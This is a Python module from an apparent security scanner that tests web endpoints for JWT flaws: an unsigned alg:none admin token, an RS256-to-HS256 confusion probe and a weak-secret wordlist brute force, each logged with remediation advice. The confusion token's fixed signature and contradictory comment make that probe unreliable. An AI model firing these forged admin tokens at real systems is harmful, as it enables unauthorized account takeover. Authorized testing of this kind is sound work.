"""
modules/jwt_tests.py
JWT vulnerability test module.

Covers:
  - alg:none bypass
  - RS256 → HS256 algorithm confusion
  - Weak HMAC secret wordlist attack

Entry point: async def run(scanner) -> None

For Authorized Security Testing and CTF Competitions Only.
"""
from __future__ import annotations

import base64
import hmac as _hmac
from typing import TYPE_CHECKING

from core.models import Vulnerability, calculate_severity

if TYPE_CHECKING:
    from core.scanner import BaseScanner

# Pre-crafted alg:none token: {"alg":"none","typ":"JWT"} . {"id":1,"email":"admin@juice-sh.op","role":"admin"}
JWT_NONE_TOKEN = (
    "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0"
    ".eyJpZCI6MSwiZW1haWwiOiJhZG1pbkBqdWljZS1zaC5vcCIsInJvbGUiOiJhZG1pbiJ9"
    "."
)

# HS256 signed with a known weak secret — server's public RS256 key used as HMAC key probe
HS256_CONFUSION_TOKEN = (
    "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9"
    ".eyJpZCI6MSwiZW1haWwiOiJhZG1pbkBqdWljZS1zaC5vcCIsInJvbGUiOiJhZG1pbiIsImlhdCI6MTY5MDAwMDAwMH0"
    ".SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c"
)

# Common weak HS256 secrets to brute-force
WEAK_SECRETS = [
    "secret", "password", "123456", "qwerty", "admin",
    "letmein", "changeme", "jwt_secret", "your_secret_key",
    "supersecret", "private_key", "hs256secret", "test",
    "jwt", "token", "key", "mykey", "mypassword",
]

# Keywords indicating auth-gated content was returned
AUTH_KEYWORDS = ["admin", "email", "role", "user", "token", "id"]


async def run(scanner: "BaseScanner", url: str) -> None:
    """Test URL for JWT vulnerabilities (once per server). Called per-URL by scan_url()."""
    await _test_jwt(scanner, url)


async def _test_jwt(scanner: "BaseScanner", url: str) -> bool:
    # ── 1. alg:none bypass ───────────────────────────────────────────────────
    for bearer_case in [f"Bearer {JWT_NONE_TOKEN}", f"bearer {JWT_NONE_TOKEN}"]:
        res = await scanner.make_request("GET", url, headers={"Authorization": bearer_case})
        if res and res.status_code == 200:
            if any(k in res.text.lower() for k in AUTH_KEYWORDS):
                severity, cvss = calculate_severity("JWT Vulnerability")
                scanner.log_vuln(Vulnerability(
                    type="JWT alg:none Bypass",
                    url=url,
                    parameter="Authorization header",
                    payload=JWT_NONE_TOKEN[:60] + "...",
                    evidence="Server accepted unsigned JWT with alg:none",
                    confidence="High",
                    severity=severity,
                    cvss_score=cvss,
                    method="GET",
                    detection_method="JWT algorithm confusion — alg:none",
                    remediation=(
                        "Reject tokens with alg:none. "
                        "Enforce an explicit algorithm allowlist server-side. "
                        "Never trust the alg header from an untrusted token."
                    ),
                    references=["CWE-345", "OWASP-A02:2021"],
                    confidence_pct=90,
                ))
                return True

    # ── 2. RS256 → HS256 algorithm confusion ─────────────────────────────────
    res_c = await scanner.make_request(
        "GET", url, headers={"Authorization": f"Bearer {HS256_CONFUSION_TOKEN}"}
    )
    if res_c and res_c.status_code == 200 and any(k in res_c.text.lower() for k in AUTH_KEYWORDS):
        severity, cvss = calculate_severity("JWT Vulnerability")
        scanner.log_vuln(Vulnerability(
            type="JWT Algorithm Confusion (RS256→HS256)",
            url=url,
            parameter="Authorization header",
            payload=HS256_CONFUSION_TOKEN[:80] + "...",
            evidence="Server accepted HS256-signed token — possible RS256→HS256 key confusion",
            confidence="Medium",
            severity=severity,
            cvss_score=cvss,
            method="GET",
            detection_method="JWT RS256→HS256 algorithm confusion probe",
            remediation=(
                "Enforce strict algorithm checking; never accept HS256 when configured for RS256. "
                "Never use the public key as an HMAC secret."
            ),
            references=["CWE-347", "OWASP-A02:2021"],
            confidence_pct=60,
        ))
        return True

    # ── 3. Weak HMAC secret wordlist ─────────────────────────────────────────
    header_b64 = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9"
    payload_b64 = (
        "eyJpZCI6MSwiZW1haWwiOiJhZG1pbkBqdWljZS1zaC5vcCIsInJvbGUiOiJhZG1pbiJ9"
    )
    signing_input = f"{header_b64}.{payload_b64}".encode()

    try:
        for secret in WEAK_SECRETS:
            sig = base64.urlsafe_b64encode(
                _hmac.new(secret.encode(), signing_input, "sha256").digest()
            ).rstrip(b"=").decode()
            weak_token = f"{header_b64}.{payload_b64}.{sig}"
            res_w = await scanner.make_request(
                "GET", url, headers={"Authorization": f"Bearer {weak_token}"}
            )
            if res_w and res_w.status_code == 200 and any(k in res_w.text.lower() for k in AUTH_KEYWORDS):
                severity, cvss = calculate_severity("JWT Vulnerability")
                scanner.log_vuln(Vulnerability(
                    type="JWT Weak Secret",
                    url=url,
                    parameter="Authorization header",
                    payload=f"HS256 signed with secret='{secret}'",
                    evidence=f"Server accepted JWT signed with weak secret '{secret}'",
                    confidence="High",
                    severity=severity,
                    cvss_score=cvss,
                    method="GET",
                    detection_method="JWT weak HMAC secret wordlist attack",
                    remediation=(
                        "Use a cryptographically random secret of at least 32 bytes. "
                        "Rotate the secret immediately and invalidate all existing tokens."
                    ),
                    references=["CWE-521", "OWASP-A02:2021"],
                    confidence_pct=88,
                ))
                return True
    except Exception:
        pass

    return False
